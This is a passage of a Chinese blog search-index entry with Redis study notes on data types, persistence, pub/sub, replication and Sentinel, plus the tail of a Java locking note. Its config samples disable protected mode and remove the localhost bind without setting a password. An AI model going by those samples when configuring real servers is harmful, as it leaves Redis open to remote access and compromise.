执行同步代码块\n\n当然，虽然通过自旋的方式可以在一定程度上减少用户态和内核态的切换，减少对操作系统中与线程相关的库函数调用，但是自旋的过程需要一直占用CPU，因此过度的自旋可能适得其反。\n最后注意，在Java代码中，如果线程获得锁后调用object.wait()方法，则会将线程加入到Monitor对象的WaitSet中，当被object.notify()唤醒后，会将线程从WaitSet移动到 _cxq 或 _EntryList中去。\n需要注意的是，当调用wait或notify方法时，如当前锁的状态是偏向锁或轻量级锁则会先膨胀成重量级锁。也就是说，wait和notify等方法依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用这些方法，否则会抛出java.lang.IllegalMonitorStateException的异常。\n","tags":["2021"]},{"title":"redis","url":"/2021/03/16/2021/redis/","content":"\n\nRedis\nRedis（Remote Dictionary Server )，即远程字典服务 !\n是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 \nredis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。\n用处：\n1、内存存储、持久化，内存中是断电即失、所以说持久化很重要（rdb、aof） \n2、效率高，可以用于高速缓存\n3、发布订阅系统\n4、地图信息分析\n5、计时器、计数器（浏览量！）\n6、……..\n特性：\n1、多样的数据类型\n2、持久化\n3、集群\n4、事务\n基础知识Redis默认有16个数据库，默认使用的是第0个数据库\n可以使用select进行切换数据库！select 3\n常用的基础命令flushdb  清除当前数据库\nFLUSHALL清除所有数据库\nRedis 是单线程的！明白Redis是很快的，官方表示，Redis是基于内存操作，CPU不是Redis性能瓶颈，Redis的瓶颈是根据\n机器的内存和网络带宽，既然可以使用单线程来实现，就使用单线程了！\nRedis 是C 语言写的，官方提供的数据为 100000+ 的QPS，完全不比同样是使用 key-vale的Memecache差！\nRedis为什么单线程还这么快？1、误区1：高性能的服务器一定是多线程的？\n2、误区2：多线程（CPU上下文会切换！）一定比单线程效率高！\n先去CPU&gt;内存&gt;硬盘的速度要有所了解！\n核心：redis 是将所有的数据全部放在内存中的，所以说使用单线程去操作效率就是最高的，多线程\n（CPU上下文会切换：耗时的操作！！！），对于内存系统来说，如果没有上下文切换效率就是最高\n的！多次读写都是在一个CPU上的，在内存情况下，这个就是最佳的方案！\n同时注意到一些问题存在：\n\nRedis真的是单线程吗？\n\nRedis的单线程主要是指Redis的处理客户端发来的命令是由一个线程来完成的，这也是Redis对外提供键值存储服务的主要流程。但Redis的其他功能，比如持久化、异步删除、集群数据同步等，其实是由额外的线程执行的。\n\nRedis单线程为什么还能这么快？\n\n因为它所有的数据都在内存中，所有的运算都是内存级别的运算，而且单线程避免了多线程的切换性能损耗问题。正因为Redis是单线程，所以要小心使用Redis指令，对于那些耗时的指令(比如KEYS)一定要谨慎使用，一不小心就可能会导致Redis卡顿。\n\nRedis 单线程如何处理那么多的并发客户端连接？\n\n进入Redis目录，执行src/redis-benchmark get命令，可以对Redis的吞吐量进行测试，结果大致是每秒可以处理10万个请求。Redis使用了IO多路复用技术，利用epoll来实现IO多路复用，将连接信息和事件放到队列中，依次放到文件事件分派器，事件分派器将事件分发给事件处理器。\n数据类型基本的有五种数据类型\nString127.0.0.1:6379&gt; keys * # 查看所有的key (empty list or set) 127.0.0.1:6379&gt; set name kuangshen # set key OK127.0.0.1:6379&gt; keys * 1) &quot;name&quot; 127.0.0.1:6379&gt; set age 1 OK127.0.0.1:6379&gt; keys * 1) &quot;age&quot; 2) &quot;name&quot; 127.0.0.1:6379&gt; EXISTS name # 判断当前的key是否存在 (integer) 1 127.0.0.1:6379&gt; EXISTS name1 (integer) 0 127.0.0.1:6379&gt; move name 1 # 移除当前的key (integer) 1 127.0.0.1:6379&gt; keys * 1) &quot;age&quot; 127.0.0.1:6379&gt; set name qinjiang OK127.0.0.1:6379&gt; keys * 1) &quot;age&quot; 2) &quot;name&quot; 127.0.0.1:6379&gt; clear 127.0.0.1:6379&gt; keys * 1) &quot;age&quot; 2) &quot;name&quot; 127.0.0.1:6379&gt; get name &quot;qinjiang&quot; 127.0.0.1:6379&gt; EXPIRE name 10 # 设置key的过期时间，单位是秒 (integer) 1 127.0.0.1:6379&gt; ttl name # 查看当前key的剩余时间 (integer) 4 127.0.0.1:6379&gt; ttl name (integer) 3 127.0.0.1:6379&gt; ttl name (integer) 2 127.0.0.1:6379&gt; ttl name (integer) 1 127.0.0.1:6379&gt; ttl name (integer) -2 127.0.0.1:6379&gt; get name (nil) 127.0.0.1:6379&gt; type name # 查看当前key的一个类型！ string 127.0.0.1:6379&gt; type age string\n\nString类似的使用场景：value除了是我们的字符串还可以是我们的数字！\n计数器\n统计多单位的数量\n粉丝数\n对象缓存存储！\n下面直接说吧–\nList在redis里面，我们可以把list玩成 栈、队列、阻塞队列！\n所有的list命令都是用l开头的，Redis不区分大小命令\n他实际上是一个链表，before Node after ， left，right 都可以插入值\n如果key 不存在，创建新的链表\n如果key存在，新增内容\n如果移除了所有值，空链表，也代表不存在！\n在两边插入或者改动值，效率最高！ 中间元素，相对来说效率会低一点~\n消息排队！消息队列 （Lpush Rpop）， 栈（ Lpush Lpop）！\nset微博，A用户将所有关注的人放在一个set集合中！将它的粉丝也放在一个集合中！\n共同关注，共同爱好，二度好友，推荐好友！（六度分割理论）\nHashMap集合，key-map! 时候这个值是一个map集合！ 本质和String类型没有太大区别，还是一个简单的\nkey-vlaue！\nset myhash fifield kuangshen\nhash变更的数据 user name age,尤其是是用户信息之类的，经常变动的信息！ hash 更适合于对象的\n存储，String更加适合字符串存储！\nZset其与的一些API，通过我们的学习吗，你们剩下的如果工作中有需要，这个时候你可以去查查看官方文\n档！\n案例思路：set 排序 存储班级成绩表，工资表排序！\n普通消息，1， 重要消息 2，带权重进行判断！\n排行榜应用实现，取Top N 测试！\n三种特殊数据类型Geospatial 地理位置朋友的定位，附近的人，打车距离计算？\nRedis 的 Geo 在Redis3.2 版本就推出了！ 这个功能可以推算地理位置的信息，两地之间的距离，方圆几里的人！\n官方文档：https://www.redis.net.cn/order/3685.html\n# getadd 添加地理位置 # 规则：两级无法直接添加，我们一般会下载城市数据，直接通过java程序一次性导入！ # 有效的经度从-180度到180度。 # 有效的纬度从-85.05112878度到85.05112878度。 # 当坐标位置超出上述指定范围时，该命令将会返回一个错误。 # 127.0.0.1:6379&gt; geoadd china:city 39.90 116.40 beijin127.0.0.1:6379&gt;  geoadd china:city 116.40 39.90 beijing(integer) 1127.0.0.1:6379&gt; geoadd china:city 121.47 31.23 shanghai(integer) 1127.0.0.1:6379&gt; GEOADD china:city 106.50 29.53 chongqi 114.05 22.52 shengzhen(integer) 2127.0.0.1:6379&gt; geoadd china:city 120.16 30.24 hangzhou 108.96 34.26 xian (integer) 2(error) ERR syntax error127.0.0.1:6379&gt; geoadd china:city 120.16 30.24 hangzhou 108.96 34.26 xian(integer) 2\n\nGEOPOS 获得当前定位：一定是一个坐标值！\n127.0.0.1:6379&gt; GEOPOS china:city xian1) 1) &quot;108.96000176668167114&quot;   2) &quot;34.25999964418929977&quot;127.0.0.1:6379&gt; GEOPOS china:city bejing1) (nil)127.0.0.1:6379&gt; GEOPOS china:city beijing1) 1) &quot;116.39999896287918091&quot;   2) &quot;39.90000009167092543&quot;\n\nGEODIST 两人之间的距离！\n单位：\nm 表示单位为米。\nkm 表示单位为千米。\nmi 表示单位为英里。\nft 表示单位为英尺。\n127.0.0.1:6379&gt; GEODIST china:city beijing shanghai km&quot;1067.3788&quot;127.0.0.1:6379&gt; GEODIST china:city beijing xian km&quot;910.0565&quot;\n\nHyperloglog什么是基数？\nA {1,3,5,7,8,7}\nB{1，3,5,7,8}\n基数（不重复的元素） &#x3D; 5，可以接受误差！\n简介\nRedis 2.8.9 版本就更新了 Hyperloglog 数据结构！\nRedis Hyperloglog 基数统计的算法！\n优点：占用的内存是固定，2^64 不同的元素的技术，只需要废 12KB内存！如果从内存角度来比较的话 Hyperloglog 首选！\n网页的 UV （一个人访问一个网站多次，但是还是算作一个人！）\n传统的方式， set 保存用户的id，然后就可以统计 set 中的元素数量作为标准判断 !\n这个方式如果保存大量的用户id，就会比较麻烦！我们的目的是为了计数，而不是保存用户id；\n127.0.0.1:6379&gt; PFadd mykey a b c d e f g h i j # 创建第一组元素 mykey (integer) 1 127.0.0.1:6379&gt; PFCOUNT mykey # 统计 mykey 元素的基数数量 (integer) 10 127.0.0.1:6379&gt; PFadd mykey2 i j z x c v b n m # 创建第二组元素 mykey2 (integer) 1 127.0.0.1:6379&gt; PFCOUNT mykey2 (integer) 9 127.0.0.1:6379&gt; PFMERGE mykey3 mykey mykey2 # 合并两组 mykey mykey2 =&gt; mykey3 并集 OK127.0.0.1:6379&gt; PFCOUNT mykey3 # 看并集的数量！ (integer) 15\n\n0.81% 错误率！ 统计UV任务，可以忽略不计的！\nBitmap位存储\n统计用户信息，活跃，不活跃！ 登录 、 未登录！ 打卡，365打卡！ 两个状态的，都可以使用\nBitmaps！\nBitmap 位图，数据结构！ 都是操作二进制位来进行记录，就只有0 和 1 两个状态！\n365 天 &#x3D; 365 bit 1字节 &#x3D; 8bit 46 个字节左右！\n例如使用bitmao来记录周一到周日的打卡\n127.0.0.1:6379&gt; SETBIT sign 0 1(integer) 0127.0.0.1:6379&gt; SETBIT sign 1 0(integer) 0127.0.0.1:6379&gt; SETBIT sign 2 0(integer) 0127.0.0.1:6379&gt; SETBIT sign 3 0(integer) 0127.0.0.1:6379&gt; SETBIT sign 4 0(integer) 0127.0.0.1:6379&gt; SETBIT sign 5 0(integer) 0127.0.0.1:6379&gt; SETBIT sign 6 1(integer) 0\n\n查看某一天是否有打卡\n127.0.0.1:6379&gt; GETBIT sign 6(integer) 1# 统计打卡127.0.0.1:6379&gt; BITCOUNT sign(integer) 2\n\n\n\n事务Redis 事务本质：一组命令的集合！ 一个事务中的所有命令都会被序列化，在事务执行过程的中，会按照顺序执行！\n一次性、顺序性、排他性！执行一些列的命令！\nredis事务：\n\n开启事务\n命令入队\n执行事务\n\n127.0.0.1:6379&gt; MULTI # 开启事务OK# 任务入队127.0.0.1:6379(TX)&gt; set liduoan v1QUEUED127.0.0.1:6379(TX)&gt; set liduoan2 v2QUEUED127.0.0.1:6379(TX)&gt; get liduoanQUEUED127.0.0.1:6379(TX)&gt; set liduoan3 v3QUEUED127.0.0.1:6379(TX)&gt; exec  # 执行事务1) OK2) OK3) &quot;v1&quot;4) OK\n\n这里的事务 运行时异常是不会被中断回滚\n官网文档上有这样一段话：\n\nA Redis script is transactional by definition, so everything you can do with a Redis transaction, you can also do with a script and usually the script will be both simpler and faster.\n官方推荐使用Lua脚本代替原生事务操作。\n\nLua脚本Redis在2.6推出了脚本功能，允许开发者使用Lua语言编写脚本传到Redis中执行。使用脚本的好处如下:\n1、减少网络开销：本来5次网络请求的操作，可以用一个请求完成，原先5次请求的逻辑放在redis服务器上完成。使用脚本，减少了网络往返时延。这点跟管道类似。\n2、原子操作：Redis会将整个脚本作为一个整体执行，中间不会被其他命令插入。管道不是原子的，不过redis的批量操作命令(类似mset)是原子的。\n3、替代redis的事务功能：redis自带的事务功能很鸡肋，报错不支持回滚，而redis的lua脚本几乎实现了常规的事务功能，支持报错回滚操作，官方推荐如果要使用redis的事务功能可以用redis lua替代。\n监控Watch\n悲观锁：\n和多线程中的解释类似，认为什么时候都会出现问题，无论做什么都会加锁\n乐观锁：\n很乐观，认为不会出现问题，所以不会上锁。\n类似CAS，Compare And Swap\nWatch 和 UNWatch需要同时做好\nRedis持久化RDBRDB快照是Redis最早的持久化方式。在默认情况下，Redis将内存数据快照保存在名字为dump.rdb的二进制文件中，也就是说，Redis会将内存中的所有信息拷贝至rdb文件中。\n你可以对Redis进行设置， 让它在N 秒内数据集至少有 M 个改动这一条件被满足时， 自动保存一次数据集。Redis的配置文redis.config中默认对RDB的配置如下：\nsave 900 1 # 900秒内有至少有1个键被改动save 300 10 # 300秒内有至少有10个键被改动save 60 10000 # 60秒内有至少有10000个键被改动dbfilename  dump.rdb # rdb文件名dir  ./ # rdb文件存储路径\n\n以上设置会让Redis在满足这些条件时， 自动保存一次数据集。 如果需要关闭RDB，只需要将所有的save保存策略注释掉即可。还可以手动执行命令生成RDB快照，进入redis客户端执行命令save或bgsave可以手动生成dump.rdb文件，每次命令执行都会将所有Redis内存快照到一个新的rdb文件里，并覆盖原有rdb快照文件。\nsave是同步IO方式，向rdb文件写信息时会阻塞其它请求。而bgsave和save命令相比，采取了异步IO方式，生成额外的子进程将内存数据写入rdb文件中，不会阻塞客户端的其它请求。\nbgsave方式借助了操作系统提供的写时复制技术（Copy-On-Write, COW），在生成快照的同时，依然可以正常处理客户端的其它写命令。简单来说，bgsave子进程是由主线程fork生成的，可以共享主线程的所有内存数据。 bgsave子进程运行后，开始读取主线程的内存数据，并把它们写入rdb文件。此时，如果主线程对这些数据也都是读操作，那么，主线程和子进程相互不影响。但是，如果主线程要修改一块数据，那么，这块数据就会被复制一份，生成该数据的副本。然后，bgsave子进程会把这个副本数据也写入rdb文件，而在这个过程中，主线程仍然可以直接修改原来的数据。\n\n\n\n命令\nsave\nbgsave\n\n\n\nIO类型\n同步\n异步\n\n\n是否阻塞redis其它命令\n是\n否(在生成子进程执行调用fork函数时会有短暂阻塞)\n\n\n优点\n不会消耗额外内存\n不阻塞客户端命令\n\n\n缺点\n阻塞客户端命令\n需要fork子进程，消耗内存\n\n\nRedis配置自动生成rdb文件后台使用的是bgsave方式。\n写时复制关于写时复制的原理需要了解清楚\n传统的操作系统，fork一个进场后，会直接将父进程的数据拷贝到子进程中，拷贝完之后，父进程和子进程之间的数据段和堆栈是相互独立的。\n而很多时候复制给子进程的数据是无效的，大都时候子进程会使用自己的方法。\n那么写时复制是指什么呢？\n\nfork创建出的子进程，与父进程共享内存空间。也就是说，如果子进程不对内存空间进行写入操作的话，内存空间中的数据并不会复制给子进程，这样创建子进程的速度就很快了！(不用复制，直接引用父进程的物理空间)。并且如果在fork函数返回之后，子进程第一时间exec一个新的可执行映像，那么也不会浪费时间和内存空间了。\n\n在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。\n当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间。\n如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。\n而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。\nCopy On Write技术实现原理：\nfork()之后，kernel把父进程中所有的内存页的权限都设为read-only，然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写内存时，CPU硬件检测到内存页是read-only的，于是触发页异常中断（page-fault），陷入kernel的一个中断例程。中断例程中，kernel就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份。\nCopy On Write技术好处是什么？\nCOW技术可减少分配和复制大量资源时带来的瞬间延时。COW技术可减少不必要的资源分配。比如fork进程时，并不是所有的页面都需要复制，父进程的代码段和只读数据段都不被允许修改，所以无需复制。Copy On Write技术缺点是什么？\n如果在fork()之后，父子进程都还需要继续进行写操作，那么会产生大量的分页错误(页异常中断page-fault)，这样就得不偿失。几句话总结Linux的Copy On Write技术：\nfork出的子进程共享父进程的物理空间，当父子进程有内存写入操作时，read-only内存页发生中断，将触发的异常的内存页复制一份(其余的页还是共享父进程的)。fork出的子进程功能实现和父进程是一样的。如果有需要，我们会用exec()把当前进程映像替换成新的进程文件，完成自己想要实现的功能。\n\n原文链接：https://blog.csdn.net/qq_32131499/article/details/94561780\n\nAOF快照功能并不是非常耐久，因为如果Redis因为某些原因而造成故障停机， 并且还没有满足RDB写文件的条件，那么服务器将丢失最近写入、且仍未保存到快照中的那些数据。从 1.1 版本开始， Redis 增加了一种完全耐久的持久化方式： *AOF（append-only file） **持久化，将**修改的每一条指令*记录进文件appendonly.aof中(先写入os cache，每隔一段时间fsync到磁盘) 。\nAOF功能默认是关闭的，如要打开需要修改配置文件中的如下内容：\nBashappendonly yes # 打开AOF # AOF多久才将数据 fsync 到磁盘一次，有三种方式：appendfsync always # 每次有新命令追加到 AOF 文件时就执行一次 fsync 慢但是非常安全 appendfsync everysec # 每秒 fsync 一次，足够快，并且在故障时只最多会丢失 1 秒钟的数据（推荐）appendfsync no # 从不 fsync ，将数据交给操作系统来处理，更快但是不安全\n\n比如我们执行命令：\nset jimmy 123 ex 1000\n\n那么该指令在AOF文件中的内容如下：\nTex*3 $3 set$5jimmy$3 888 *3 $9 PEXPIREAT $5jimmy$13 1604249998764\n\n这是一种resp协议格式数据，*后面的数字代表命令有多少个参数，$号后面的数字代表这个参数有几个字符。如果执行带过期时间的set命令，AOF文件里记录的是并不是执行的原始命令，而是记录key过期的时间戳。\n\nAOF重写\n\nAOF文件里可能有太多没用的指令，所以AOF会定期根据内存的最新数据生成AOF文件。比如说对某个值进行了多次INCR加1操作，那么会将这些INCR操作直接替换成一个SET操作，可以压缩AOF文件的大小并且加快数据恢复速度。配置文件中如下两个配置可以控制AOF自动重写频率：\n# AOF文件至少要达到64M才会自动重写，文件太小恢复速度本来就很快，重写的意义不大auto‐AOF‐rewrite‐min‐size 64mb  # AOF文件自上一次重写后文件大小增长了100%则再次触发重写auto‐AOF‐rewrite‐percentage 100\n\n当然AOF也可以手动重写，进入redis客户端执行命令bgrewriteAOF重写AOF。AOF重写时，Redis会fork出一个子进程去做(与bgsave命令类似)，不会对Redis的其它命令处理有太多影响。\nAOP与RDB比较\n\n\n方式\nRDB\nAOP\n\n\n\n启动优先级\n低\n高\n\n\n文件中存储的内容\n内存数据的快照\n执行的修改指令\n\n\n体积\n小\n大\n\n\n恢复速度\n快\n慢\n\n\n数据安全性\n容易丢数据\n根据策略决定\n\n\n这两种方式生产环境可以都启用，Redis启动时如果既有rdb文件又有AOF文件，则优先选择AOF文件恢复数据，因为AOF一般来说数据更全一点。\nRedis4.0混合持久化重启Redis时，我们很少使用 RDB来恢复内存状态，因为可能会丢失大量数据。我们通常使用AOF日志进行恢复，但是通过AOF日志恢复的性能相对RDB来说要慢很多，这样在Redis实例很大的情况下，启动需要花费很长的时间。 Redis4.0为了解决这个问题，带来了一个新的持久化选项——混合持久化。\n通过如下配置可以开启混合持久化(必须先开启AOF)：\nAOF‐use‐rdb‐preamble yes\n\n如果开启了混合持久化，AOF写文件时，不再是单纯将内存数据转换为RESP指令写入AOF文件，而是将重写这一刻之前的内存做RDB快照处理，并且将RDB快照内容写入AOF文件。如果在写AOF文件的时候还要有它指令正在执行，那么会将这些指令以RESP指令的结果存储在AOF文件中。简单来说，混合持久化方式下，AOF文件中的内容为：RDB快照 + 增量AOF。新的文件一开始不叫appendonly.aof，等到重写完新的AOF文件才会进行改名，覆盖原有的AOF文件，完成新旧两个AOF文件的替换。于是在 Redis 重启的时候，可以先加载RDB的内容，然后再恢复增量AOF ，就可以完全替代之前的AOF全量文件的恢复，因此重启效率大幅得到提升。\n\nRedis的数据恢复是自动的，只要将日志文件放在配置文件中指定的路径下，重启Redis后会根据AOF或者RDB文件自动恢复数据。\n\nRedis数据备份策略\n写crontab定时调度脚本（Linux中通过crontab -e命令编辑）。可以每小时都copy一份RDB或AOF的备份到一个目录中去，仅仅保留最近48小时的备份。\n每天都保留一份当日的数据备份到一个目录中去，可以保留最近1个月的备份。\n每次备份的时候，都把太旧的备份给删了。\n每天晚上将当前机器上的备份复制一份到其他机器上，以防机器损坏。\n\n\nRedisTemplate一般在企业级开发中，会对原生的Template进行更改升级，而不是直接使用原生的springboot的redis进行操作\n@Bean public RedisTemplate redisTemplate(RedisConnectionFactory redisConnectionFactory) &#123;     RedisTemplate&lt;Object, Object&gt; template = new RedisTemplate();     template.setConnectionFactory(redisConnectionFactory);     Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);     jackson2JsonRedisSerializer.setObjectMapper(new ObjectMapper());     //redis的键进行序列化 是String     template.setKeySerializer(new StringRedisSerializer());     //对值进行序列化     template.setValueSerializer(jackson2JsonRedisSerializer);     //对模板的Hash键进行序列化     template.setHashKeySerializer(new StringRedisSerializer());     //对模板的值进行序列化     template.setHashValueSerializer(jackson2JsonRedisSerializer);     //返回模板     return template; &#125;\n\n然后我们会使用对应的RedisUtil进行封装处理\n@Componentpublic class RedisUtil &#123;    @Autowired    private RedisTemplate redisTemplate;&#125;\n\nRedis.conf详解发布订阅Redis 发布订阅(pub&#x2F;sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。微信、微博、关注系统！\nRedis 客户端可以订阅任意数量的频道。\n订阅&#x2F;发布消息图：\n\n第一个：消息发送者， 第二个：频道 第三个：消息订阅者！\nRedis 发布订阅命令下表列出了 redis 发布订阅常用命令：\n\n\n\n序号\n命令及描述\n\n\n\n1\n[PSUBSCRIBE pattern pattern …] 订阅一个或多个符合给定模式的频道。\n\n\n2\n[PUBSUB subcommand argument [argument …]] 查看订阅与发布系统状态。\n\n\n3\nPUBLISH channel message 将信息发送到指定的频道。\n\n\n4\n[PUNSUBSCRIBE pattern [pattern …]] 退订所有给定模式的频道。\n\n\n5\n[SUBSCRIBE channel channel …] 订阅给定的一个或多个频道的信息。\n\n\n6\n[UNSUBSCRIBE channel [channel …]] 指退订给定的频道。\n\n\n实例以下实例演示了发布订阅是如何工作的，需要开启两个 redis-cli 客户端。\n在我们实例中我们创建了订阅频道名为 runoobChat:\n第一个 redis-cli 客户端redis 127.0.0.1:6379**&gt;** SUBSCRIBE runoobChatReading messages... **(**press Ctrl-C to quit**)**1**)** &quot;subscribe&quot;2**)** &quot;redisChat&quot;3**)** **(**integer**)** 1\n\n\n\n现在，我们先重新开启个 redis 客户端，然后在同一个频道 runoobChat 发布两次消息，订阅者就能接收到消息。\n第二个 redis-cli 客户端redis 127.0.0.1:6379&gt; PUBLISH runoobChat &quot;Redis PUBLISH test&quot;(integer) 1redis 127.0.0.1:6379&gt; PUBLISH runoobChat &quot;Learn redis by runoob.com&quot;(integer) 1# 订阅者的客户端会显示如下消息 1) &quot;message&quot; 2) &quot;runoobChat&quot; 3) &quot;Redis PUBLISH test&quot; 1) &quot;message&quot; 2) &quot;runoobChat&quot; 3) &quot;Learn redis by runoob.com&quot;\n\n\n\ngif 演示如下：\n\n开启本地 Redis 服务，开启两个 redis-cli 客户端。\n在第一个 redis-cli 客户端输入 SUBSCRIBE runoobChat，意思是订阅 runoobChat 频道。\n在第二个 redis-cli 客户端输入 PUBLISH runoobChat “Redis PUBLISH test” 往 runoobChat 频道发送消息，这个时候在第一个 redis-cli 客户端就会看到由第二个 redis-cli 客户端发送的测试消息。\n\n原理Redis是使用C实现的，通过分析 Redis 源码里的 pubsub.c 文件，了解发布和订阅机制的底层实现，籍此加深对 Redis 的理解。\n通过 SUBSCRIBE 命令订阅某频道后，redis-server 里维护了一个字典，字典的键就是一个个 频道！\n而字典的值则是一个链表，链表中保存了所有订阅这个 channel 的客户端。SUBSCRIBE 命令的关键，就是将客户端添加到给定 channel 的订阅链表中\n通过 PUBLISH 命令向订阅者发送消息，redis-server 会使用给定的频道作为键，在它所维护的 channel字典中查找记录了订阅这个频道的所有客户端的链表，遍历这个链表，将消息发布给所有订阅者。\nPub&#x2F;Sub 从字面上理解就是发布（Publish）与订阅（Subscribe），在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这一功能最明显的用法就是用作实时消息系统，比如普通的即时聊天，群聊等功能。\n使用场景：\n1、实时消息系统！\n2、事实聊天！（频道当做聊天室，将信息回显给所有人即可！）\n3、订阅，关注系统都是可以的！\n稍微复杂的场景我们就会使用 消息中间件 MQ （）\n主从复制概念\n主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。\n前者称为主节点(master&#x2F;leader)，后者称为从节点(slave&#x2F;follower)；数据的复制是单向的，只能由主节点到从节点。\nMaster以写为主，Slave 以读为主。\n默认情况下，每台Redis服务器都是主节点；\n且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。\n主从复制的作用主要包括：\n1、数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。\n2、故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。\n3、负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。\n4、高可用（集群）基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。\n一般来说，要将Redis运用于工程项目中，只使用一台Redis是万万不能的（宕机），原因如下：\n1、从结构上，单个Redis服务器会发生单点故障，并且一台服务器需要处理所有的请求负载，压力较大；\n2、从容量上，单个Redis服务器内存容量有限，就算一台Redis服务器内存容量为256G，也不能将所有内存用作Redis存储内存，一般来说，单台Redis最大使用内存不应该超过20G。\n电商网站上的商品，一般都是一次上传，无数次浏览的，说专业点也就是”多读少写”。\n对于这种场景，我们可以使如下这种架构：\n\n主从复制，读写分离！ 80% 的情况下都是在进行读操作！减缓服务器的压力！架构中经常使用！ 一主二从！\n只要在公司中，主从复制就是必须要使用的，因为在真实的项目中不可能单机使用Redis！ \n配置方式环境配置的时候只需要配置从节点，redis默认主节点。\n复制redis.conf文件，将从Redis节点的相关配置文件修改为如下值：\n# 从Redis端口 port 6380 # 把pid进程号写入pidfile配置的文件pidfile /var/run/redis_6380.pid  # 日志文件logfile &quot;6380.log&quot;# 指定数据存放目录dir /usr/local/redis‐5.0.3/data/6380 # 后台启动daemonize yes# 关闭保护模式，开启的话，只有本机才可以访问redisprotected‐mode no # 注释掉 bind 127.0.0.1# 配置主从复制 # 从本机6379的redis实例复制数据，Redis5.0之前使用slaveof而不是replicaof# replicaof 192.168.65.61 6379 # 配置从节点只读 replica‐read‐only yes\n\n之后是从节点的手动命令\n127.0.0.1:6379&gt; info replication # 查看当前库的信息# 手动说明主节点是哪个？127.0.0.1:6380&gt; SLAVEOF 127.0.0.1 6379 # SLAVEOF host 6379 找谁当自己的老大！\n\n测试：\n当主机被shutdown后，从机依旧连接主机，但是没有写的操作。\n这个时候主机回来后，从机依旧可以获取主机写的信息。\n如果是命令行配置的从机，那么在重启从机之后会又变成主机。\n但是重新给这个从机配置，就会读取主机的值\n主从工作原理如果你为master配置了一个slave，主从数据同步的步骤如下：\n\n不管这个slave是否是第一次连接上Master，它都会发送一个PSYNC命令给master请求复制数据。\nmaster收到PSYNC命令后，会在后台进行数据持久化，通过bgsave生成最新的rdb快照文件。\n持久化期间，master会继续接收客户端的请求，它会把这些可能修改数据集的请求缓存在内存中。\n当master持久化进行完毕以后，master会把这份rdb文件数据集发送给slave。\nslave把接收到的数据进行持久化生成rdb文件，并且清除老数据，然后再加载到内存中。\nmaster再将之前缓存在内存中的命令发送给slave，slave再次进行数据同步。\n\n\n全量复制：而slave服务在接收到数据库文件数据后，将其存盘并加载到内存中。\n增量复制：Master 继续将新的所有收集到的修改命令依次传给slave，完成同步\n只要是重新连接master，一次完全同步（全量复制）将被自动执行！ 我们的数据一定可以在从机中看到！\n主机宕机当主机宕机之后，那么就不能进行写操作了。\n这个时候就会出问题。\n\n谋朝篡位\n\n如果主机断开了连接，我们可以使用 SLAVEOF no one 让自己变成主机！其他的节点就可以手动连\n接到最新的这个主节点（手动）！如果这个时候老大修复了，那就重新连接！\n那么引下来的就是另外一个知识点了\n哨兵模式主从切换技术的方法是：当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。\nRedis从2.8开始正式提供了Sentinel（哨兵） 架构来解决这个问题。\n谋朝篡位的自动版，能够后台监控主机是否故障，如果故障了根据投票数自动将从库转换为主库。\nsentinel哨兵是特殊的redis，它们不提供读写服务，主要用来监控redis实例节点。 哨兵架构下客户端第一次从哨兵找出redis的主节点，后续就直接访问redis的主节点，不会每次都通过sentinel代理访问redis的主节点。当redis的主节点发生变化，哨兵会第一时间感知到，并且将新的redis主节点通知给客户端(这里面redis的客户端一般都实现了订阅功能，订阅sentinel发布的节点变动消息) 。\n配置方式Redis中为我们提供了sentinel.config哨兵配置文件，只要拷贝后稍作修改即可：\n# 先复制一份sentinel.conf文件，假设哨兵节点的端口号为26379cp sentinel.conf sentinel‐26379.conf# 后台启动daemonize yes# 关闭保护模式，开启的话，只有本机才可以访问redisprotected‐mode no # 注释掉 bind 127.0.0.1# 修改端口号port 26379# 把pid进程号写入pidfile配置的文件pidfile /var/run/redis_26379.pid  # 日志文件logfile &quot;26379.log&quot;# 指定数据存放目录dir /usr/local/redis‐5.0.3/data/26379# 配置监控集群的主节点，格式为：# sentinel monitor &lt;master‐redis‐name&gt; &lt;master‐redis‐ip&gt; &lt;master‐redis‐port&gt; &lt;quorum&gt;# quorum是一个数字，表示当有多少个sentinel认为一个master失效时(值一般为：sentinel总数/2 + 1)，# master才算真正失效 sentinel monitor mymaster 192.168.65.61 6379 2 # mymaster这个名字随便取，客户端访问时会用到# 启动sentinel哨兵实例，指定哨兵配置文件src/redis‐sentinel sentinel‐26379.conf\n\n可以配置多个哨兵节点，按照上述内容稍作修改即可。sentinel集群都启动完毕后，会将哨兵集群的元数据信息写入所有sentinel的配置文件里去(追加在文件的最下面)，我们查看下如下配置文件sentinel-26379.conf，如下所示：\nBash# 代表主节点的从节点信息sentinel known‐replica mymaster 192.168.65.61 6380sentinel known‐replica mymaster 192.168.65.61 6381# 其它哨兵节点sentinel known‐sentinel 